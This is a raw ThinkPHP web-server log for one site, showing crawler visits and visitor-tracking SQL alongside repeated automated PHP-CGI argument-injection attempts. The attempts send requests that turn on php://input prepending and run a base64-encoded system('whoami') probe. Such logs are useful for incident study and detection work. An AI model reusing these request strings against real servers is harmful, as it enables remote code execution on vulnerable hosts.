  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000930s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.121853s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '43.131.48.214' ORDER BY `Id` DESC LIMIT 1 [ RunTime:3.062561s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.066907s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '43.131.48.214' [ RunTime:0.007095s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('43.131.48.214' , 1 , '2024-08' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-08-31 15:17:25' , 1 , 'æ™®é€šç½‘å‹') [ RunTime:0.000563s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '43.131.48.214'  AND `ucookie` IS NULL [ RunTime:0.006990s ]
---------------------------------------------------------------
[ 2024-08-31T16:01:55+08:00 ] 141.98.83.185 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.343756s] [åžåçŽ‡ï¼š2.91req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T16:01:57+08:00 ] 141.98.83.185 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015283s] [åžåçŽ‡ï¼š65.43req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T17:36:54+08:00 ] 141.98.83.185 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.350310s] [åžåçŽ‡ï¼š2.85req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T17:36:55+08:00 ] 141.98.83.185 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015359s] [åžåçŽ‡ï¼š65.11req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T19:05:46+08:00 ] 66.249.66.203 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.979521s] [åžåçŽ‡ï¼š1.02req/s] [å†…å­˜æ¶ˆè€—ï¼š2,948.05kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.119 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'from' => 'googlebot(at)googlebot.com',
  'accept' => 'text/html,application/xhtml+xml,application/signed-exchange;v=b3,application/xml;q=0.9,*/*;q=0.8',
  'connection' => 'keep-alive',
  'amp-cache-transform' => 'google;v="1..8"',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.004021s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.069074s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '66.249.66.203' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.008373s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000513s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '66.249.66.203' [ RunTime:0.114943s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('66.249.66.203' , 2 , '2024-08' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-08-31 19:05:46' , 14 , 'æ™®é€šç½‘å‹') [ RunTime:0.000598s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '66.249.66.203'  AND `ucookie` IS NULL [ RunTime:0.007448s ]
---------------------------------------------------------------
[ 2024-08-31T19:07:19+08:00 ] 66.249.66.205 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.053643s] [åžåçŽ‡ï¼š18.64req/s] [å†…å­˜æ¶ˆè€—ï¼š2,946.06kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'from' => 'googlebot(at)googlebot.com',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000871s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002689s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '66.249.66.205' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.001595s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000343s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '66.249.66.205' [ RunTime:0.007256s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('66.249.66.205' , 3 , '2024-08' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-08-31 19:07:19' , 11 , 'æ™®é€šç½‘å‹') [ RunTime:0.000511s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '66.249.66.205'  AND `ucookie` IS NULL [ RunTime:0.006686s ]
---------------------------------------------------------------
[ 2024-08-31T19:07:20+08:00 ] 66.249.66.204 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.048939s] [åžåçŽ‡ï¼š20.43req/s] [å†…å­˜æ¶ˆè€—ï¼š2,946.89kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'from' => 'googlebot(at)googlebot.com',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000842s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002791s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '66.249.66.204' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000530s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000366s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '66.249.66.204' [ RunTime:0.006912s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('66.249.66.204' , 4 , '2024-08' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-08-31 19:07:20' , 7 , 'æ™®é€šç½‘å‹') [ RunTime:0.000428s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '66.249.66.204'  AND `ucookie` IS NULL [ RunTime:0.006380s ]
---------------------------------------------------------------
[ 2024-08-31T19:07:20+08:00 ] 66.249.66.204 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.040638s] [åžåçŽ‡ï¼š24.61req/s] [å†…å­˜æ¶ˆè€—ï¼š2,944.76kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'from' => 'googlebot(at)googlebot.com',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.001402s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002628s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '66.249.66.204' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000436s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000297s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '66.249.66.204'  AND `ucookie` IS NULL [ RunTime:0.006478s ]
---------------------------------------------------------------
[ 2024-08-31T19:07:22+08:00 ] 66.249.66.203 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š0.041665s] [åžåçŽ‡ï¼š24.00req/s] [å†…å­˜æ¶ˆè€—ï¼š2,943.93kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
  'from' => 'googlebot(at)googlebot.com',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000594s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.002770s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '66.249.66.203' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000447s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.000369s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '66.249.66.203'  AND `ucookie` IS NULL [ RunTime:0.006801s ]
---------------------------------------------------------------
[ 2024-08-31T19:09:30+08:00 ] 141.98.83.185 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.474593s] [åžåçŽ‡ï¼š2.11req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T19:09:31+08:00 ] 141.98.83.185 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015789s] [åžåçŽ‡ï¼š63.34req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T20:36:51+08:00 ] 141.98.83.185 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.417424s] [åžåçŽ‡ï¼š2.40req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T20:36:52+08:00 ] 141.98.83.185 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015383s] [åžåçŽ‡ï¼š65.01req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T22:22:30+08:00 ] 5.181.86.85 POST aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.707057s] [åžåçŽ‡ï¼š1.41req/s] [å†…å­˜æ¶ˆè€—ï¼š1,338.28kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '110',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
  '<?php_phpinfo();_echo_eval(base64_decode(\'ZWNobyAnW1NdJzsgc3lzdGVtKCd3aG9hbWknKTsgZWNobyAnW0VdJzs' => '\')); die()?>',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T22:22:32+08:00 ] 5.181.86.85 GET aosuper.com/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D%22%22+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input
[è¿è¡Œæ—¶é—´ï¼š0.015242s] [åžåçŽ‡ï¼š65.61req/s] [å†…å­˜æ¶ˆè€—ï¼š1,335.35kb] [æ–‡ä»¶åŠ è½½ï¼š36]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'php-cgi',
    1 => 'php-cgi.exe',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.22.0',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  '­d_cgi_force_redirect=0_­d_disable_functions=""_­d_allow_url_include=1_­d_auto_prepend_file=php://input' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2024-08-31T23:00:07+08:00 ] 94.156.177.142 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š4.369039s] [åžåçŽ‡ï¼š0.23req/s] [å†…å­˜æ¶ˆè€—ï¼š2,944.13kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.25.1',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /www/wwwroot/tb.youanfutang.cn/application/index/controller/Index.php ]
[ info ] [ VIEW ] /www/wwwroot/tb.youanfutang.cn/public/../application/index/view/index/login1.html [ array (
  0 => 'iflogin',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.038262s ] mysql:host=127.0.0.1;dbname=tb_youanfutang_c;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `webdata` [ RunTime:0.037346s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '94.156.177.142' ORDER BY `Id` DESC LIMIT 1 [ RunTime:2.549832s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewtime` = '2024-08' ORDER BY `Id` DESC LIMIT 1 [ RunTime:0.001223s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `viewip` = '94.156.177.142' [ RunTime:0.006632s ]
[ sql ] [ SQL ] INSERT INTO `webdata` (`viewip` , `webpv` , `viewtime` , `operation` , `opertime` , `ipnum` , `ipvip`) VALUES ('94.156.177.142' , 1 , '2024-08' , 'è®¿å®¢-æµè§ˆç½‘é¡µ' , '2024-08-31 23:00:04' , 1 , 'æ™®é€šç½‘å‹') [ RunTime:0.000509s ]
[ sql ] [ SQL ] SELECT * FROM `webdata` WHERE  `webip` = '94.156.177.142'  AND `ucookie` IS NULL [ RunTime:0.007131s ]
---------------------------------------------------------------
[ 2024-08-31T23:00:07+08:00 ] 94.156.177.142 GET aosuper.com/
[è¿è¡Œæ—¶é—´ï¼š3.067393s] [åžåçŽ‡ï¼š0.33req/s] [å†…å­˜æ¶ˆè€—ï¼š2,944.13kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /www/wwwroot/tb.youanfutang.cn/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.25.1',
  'host' => 'aosuper.com',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
